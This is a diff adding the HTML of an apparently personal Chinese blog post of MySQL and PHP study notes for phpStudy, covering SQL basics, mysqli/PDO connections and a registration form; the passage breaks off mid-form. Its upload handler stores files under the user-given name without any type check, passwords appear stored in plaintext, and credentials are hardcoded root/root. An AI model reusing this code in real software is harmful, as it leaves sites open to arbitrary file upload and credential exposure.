@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>【在xp.cn上】MySQL+PHP复习 |  BROCADEMAPLE</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/images/ayer-side.svg" />
+       
+<link rel="stylesheet" href="/project/dist/main.css">
+
+      
+<link rel="stylesheet" href="/project/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/project/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-CS_Notes/Database/PHP+MySQL_note_and_practice"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  【在xp.cn上】MySQL+PHP复习
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/project/2024/07/11/CS_Notes/Database/PHP+MySQL_note_and_practice/" class="article-date">
+  <time datetime="2024-07-10T16:00:00.000Z" itemprop="datePublished">2024-07-11</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/notes/">notes</a> / <a class="article-category-link" href="/project/categories/notes/PHP-notes/">PHP notes</a> / <a class="article-category-link" href="/project/categories/notes/SQL-notes/">SQL notes</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">4.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">21 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="xp-cn下的MySQL"><a class="header-anchor" href="#xp-cn下的MySQL">¶</a>xp.cn下的MySQL</h2>
+<p>本地的MySQL之前被卸载了，为了不跟小皮的冲突</p>
+<p>访问xp.cn的MySQL路径：<code>phpstudy_pro\Extensions\MySQL5.7.26\bin</code></p>
+<p>在当前路径下访问cmd</p>
+<p><code>mysql -uroot -p</code>     密码可见小皮界面的数据库模块</p>
+<p><code>show databases;</code> 查看所有库</p>
+<p><code>use database_name;</code> 使用某个库</p>
+<p><code>show tables;</code>  显示当前库中所有的表</p>
+<p><code>select * from table_name;</code>  显示当前库中某表的所有内容</p>
+<h2 id="创建数据库与表，插入数据"><a class="header-anchor" href="#创建数据库与表，插入数据">¶</a>创建数据库与表，插入数据</h2>
+<h4 id="数据库的整体结构："><a class="header-anchor" href="#数据库的整体结构：">¶</a><strong>数据库的整体结构：</strong></h4>
+<ul>
+<li>电脑（服务器）-&gt;数据库软件（mysql、mssql、甲骨文、mariadb…）-&gt;数据库-&gt; 表-&gt;字段</li>
+</ul>
+<h4 id="数据库进入方法："><a class="header-anchor" href="#数据库进入方法：">¶</a><strong>数据库进入方法：</strong></h4>
+<p>​	1、直接进入</p>
+<p>​	2、使用软件连接</p>
+<p>​	3、使用phpmyadmin //注意，PHP版本要高于7.0才可以直接使用</p>
+<p>​	进入sql代码，在mysql的bin路径输入</p>
+<p>​	<code>.\mysql.exe -h 127.0.0.1 -u root -p</code></p>
+<h4 id="数据库操纵语句"><a class="header-anchor" href="#数据库操纵语句">¶</a><strong>数据库操纵语句</strong></h4>
+<ul>
+<li>
+<p>查询MySQL内的数据库</p>
+<ul>
+<li>show databases;`</li>
+</ul>
+</li>
+<li>
+<p>创建库</p>
+<ul>
+<li>create database kkk;`</li>
+</ul>
+</li>
+<li>
+<p>删除库</p>
+<ul>
+<li>drop database kkk;`</li>
+</ul>
+</li>
+<li>
+<p>创建表，之前需要先构思好表单的结构，然后创建每个表的属性</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>user</th>
+<th>pass</th>
+<th>phone</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>123456</td>
+<td>13800000000</td>
+</tr>
+<tr>
+<td>自增数字</td>
+<td>字符串</td>
+<td>字符串</td>
+<td>数字</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use kkk; //进入库</span><br><span class="line">//创建kkk_tbl表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span><br><span class="line">`id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">`user` VARCHAR(10) NOT NULL,</span><br><span class="line">`pass` VARCHAR(10) NOT NULL,</span><br><span class="line">`phone` INT(11) NOT NULL,</span><br><span class="line">PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。</p>
+</li>
+<li>
+<p>DEFAULT value - 设置默认值</p>
+</li>
+<li>
+<p>UNSIGNED - 使用无符号数值类型，0 及正数</p>
+</li>
+<li>
+<p>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1</p>
+</li>
+<li>
+<p>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的PRIMARY KEY 设置为 ID 数值，与 AUTO_INCREMENT 一起使用。</p>
+</li>
+</ul>
+<h4 id="查看表的框架"><a class="header-anchor" href="#查看表的框架">¶</a>查看表的框架</h4>
+<p><code>desc kkk_tbl;</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | Field | Type | Null | Key |</span></span><br><span class="line"><span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | id | int(10)</span></span><br><span class="line">unsigned <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> auto_increment <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> pass <span class="operator">|</span></span><br><span class="line"><span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> phone <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+--</span></span><br><span class="line"><span class="comment">---+---------+----------------+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>增加数据</p>
+<ul>
+<li><code>insert into kkk_tbl(user,pass,phone) values('admin','123456','1380000000');</code></li>
+</ul>
+</li>
+<li>
+<p>删除数据</p>
+<ul>
+<li><code>delete from kkk_tbl where user=&quot;admin&quot;;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="PHP联动MySQL"><a class="header-anchor" href="#PHP联动MySQL">¶</a>PHP联动MySQL</h2>
+<ul>
+<li>PHP创建数据库</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 面向过程</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;  <span class="comment">// 数据库名为myDB</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>连接数据</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>其他需要调用该文件的php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;create DATABASE myDaB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>面向对象的</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用PDO</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> 		<span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>&quot;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">	<span class="comment">// 设置 PDO 错误模式为异常</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, 	PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDBPDO&quot;</span>;</span><br><span class="line"><span class="comment">// 使用 exec() ，因为没有结果返回</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="literal">null</span>;  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>创建表（面对过程）</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要设置进去的库</span></span><br><span class="line">conn.php 文件 新增</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>生成表内基本框架</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">`id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">`user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`phone` INT(11) NOT NULL,</span></span><br><span class="line"><span class="string">PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">)ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;创建数据表错误: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="注册界面任务分解"><a class="header-anchor" href="#注册界面任务分解">¶</a>注册界面任务分解</h2>
+<h4 id="网站注册界面-网站首页"><a class="header-anchor" href="#网站注册界面-网站首页">¶</a>网站注册界面/网站首页</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian; 输出验证</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line"><span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line"><span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line"><span class="comment">//密码验证</span></span><br><span class="line"><span class="comment">//手机11位</span></span><br><span class="line"><span class="comment">//文件上传jpg</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">	<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; 